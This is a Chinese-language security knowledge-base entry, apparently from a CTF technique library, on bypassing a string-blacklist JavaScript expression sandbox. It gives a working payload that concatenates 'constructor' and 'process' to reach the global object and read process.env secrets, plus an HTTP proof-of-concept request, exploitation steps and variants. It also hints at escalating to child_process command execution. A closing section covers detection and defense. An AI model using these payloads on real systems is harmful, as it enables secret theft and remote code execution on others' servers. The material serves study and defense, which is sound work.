---
id: web-nodejs-expression-blacklist-string-concat-process-env
title: JS 表达式黑名单绕过：字符串拼接 constructor 取 globalThis，读 process.env 密钥
type: scenario
domain: web
path: web/nodejs
technique: js-expression-blacklist-string-concat-global
aliases:
- lintExpression 绕过
- constructor 字符串拼接
- '[].filter.constructor'
- return this globalThis
- process.env RUNNER_KEY
- Bun TypeScript 表达式沙箱
- JS 黑名单绕过
tags:
- nodejs
- javascript
- bun
- typescript
- sandbox-escape
- waf-bypass
- expression
- process-env
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:27:11+08:00'
  notes: 已对照原文核对：lintExpression 的 BLOCKED_EXPRESSION_TOKENS（process/globalthis/constructor/function/require/import/fetch/bun/http/spawn/eval/node:/child_process/websocket）用 lowered.includes 匹配、payload [].filter["constru"+"ctor"]("return this")()["pro"+"cess"].env.RUNNER_KEY、结果回显 RUNNER_KEY 均一致。未验证点：无靶机，PoC 未复跑；原文未标注受影响版本；frontmatter 无 sources/source_url。
---

## 一句话结论

服务端用 `includes()` 对表达式做关键字黑名单（`process`、`globalThis`、`constructor`、`function`、`require`、`eval` 等）时，可以写成 `[].filter["constru"+"ctor"]("return this")()["pro"+"cess"].env.RUNNER_KEY`：字符串拼接让请求里不出现 `constructor`/`process` 字面量，`Function("return this")()` 返回全局对象，最终读取 `process.env` 中的密钥。

## 原理

- 目标 `lintExpression` 把表达式转小写后，逐个检查 `BLOCKED_EXPRESSION_TOKENS.includes(token)`；黑名单包括 `process`、`globalthis`、`constructor`、`function`、`require`、`import`、`fetch`、`bun`、`http`、`spawn`、`eval`、`node:`、`child_process`、`websocket`。
- 这种过滤只匹配连续字面量，不理解 JavaScript 语法：
  - `[].filter` 是一个函数对象；`[].filter["constru"+"ctor"]` 在运行时拼成 `[].filter.constructor`，即 `Function` 构造函数。
  - `Function("return this")()` 在非严格模式下返回全局对象（`globalThis`/`global`）。
  - `["pro"+"cess"]` 拼成 `process`，`.env.RUNNER_KEY` 读取环境变量。
- 整个 payload 中不出现 `constructor`、`process`、`globalThis`、`function` 等连续关键字，`includes()` 全部漏过；而 JS 运行时按字符串拼接结果访问属性/调用函数，语义完全成立。
- 如果服务端用 `eval`/`new Function` 执行表达式，且结果会返回给调用者，就能直接读出密钥；即使不回显，也可以用同样的全局对象做侧信道/外带。
- 根因是“用字符串黑名单做沙箱”，而 JS 有字符串拼接、计算属性、`Function` 构造器、`this` 等多种等价写法；真正的沙箱必须做 AST 白名单/隔离运行时。

## 触发条件

- 应用提供表达式求值/公式执行接口（低代码、规则引擎、workflow、模板表达式）。
- 过滤器是关键字 `includes`/正则黑名单，未做 AST 解析或语法级白名单。
- 求值环境与主进程共享 `process.env`、全局对象或模块系统；没有隔离 VM/Worker。
- 表达式结果可回显，或可通过错误/网络外带。
- 攻击者能访问该接口并通过权限校验（可与 COALESCE 提权等组合）。

## 利用步骤

1. 用简单表达式（如 `1+1`）确认求值接口与返回格式。
2. 测试黑名单：提交含 `process`、`constructor` 的表达式，观察 403/错误。
3. 用字符串拼接绕过：
   ```javascript
   [].filter["constru"+"ctor"]("return this")()["pro"+"cess"].env
   ```
4. 逐步读取目标变量（如 `RUNNER_KEY`、数据库密码、JWT 密钥），确认结果回显。
5. 若需要执行命令，可继续 `["pro"+"cess"].mainModule["requ"+"ire"]("child_process")...`，或 `Function` 构造器执行代码；注意后续关键字同样要拼接/编码。
6. 用读到的密钥完成后续签名/证明链（如 SHA1 proof）。

## PoC

```http
POST /api/release/execute HTTP/1.1
Host: target
Authorization: Bearer <token>
Content-Type: application/json

{"expression":"[].filter[\"constru\"+\"ctor\"](\"return this\")()[\"pro\"+\"cess\"].env.RUNNER_KEY","input":{}}
```

响应：

```json
{"ok":true,"result":"<RUNNER_KEY>"}
```

读取整个环境：

```javascript
[].filter["constru"+"ctor"]("return this")()["pro"+"cess"].env
```

## 变体与关联

- **全局对象变体**：`Function("return this")()`、`(function(){return this})()`、`[].filter.constructor`、`(0,eval)("this")`、`globalThis` 的拼接/Unicode 写法。
- **属性访问变体**：`["pro"+"cess"]`、`["globa"+"lThis"]`、`["constr"+"uctor"]`、`process`、`atob()`/`String.fromCharCode()` 构造关键字。
- **模块/命令变体**：`process.mainModule.require("child_process")`、`module.constructor._load`、`import()`、`Bun.spawn`；同样需要拆分关键字。
- **关联**：[[web-nodejs-vm2-buffer-slab-jwt-secret-leak]]（Node VM 沙箱逃逸/密钥泄露）；[[web-nodejs-chancms-gather-new-function-code-injection]]（`new Function` 代码注入）；[[web-generic-ssti-waf-string-concat-eq-globals-bypass]]（字符串拼接绕过 WAF 的通用思路）。
- **边界**：若服务端使用 AST 白名单、隔离 VM/Worker 且不暴露 `process`/全局对象、或表达式结果不回显且无外带信道，本路径失效。

## 检测与防御

- **检测**：表达式出现 `constructor`、`process`、`globalThis`、`Function`、`eval`、`require` 及其拼接/Unicode 变体；`[].filter`、`["constru"`、`["pro"` 等组合；表达式返回环境变量/密钥。
- **防御**：不要用字符串黑名单做沙箱；使用 AST 白名单/受限表达式引擎，只允许算术、比较、白名单函数。
- **加固**：在隔离 Worker/VM 中求值，禁用 `process`/`require`/`Function`；不要把密钥放在表达式进程的环境变量中；结果输出做敏感字段过滤。
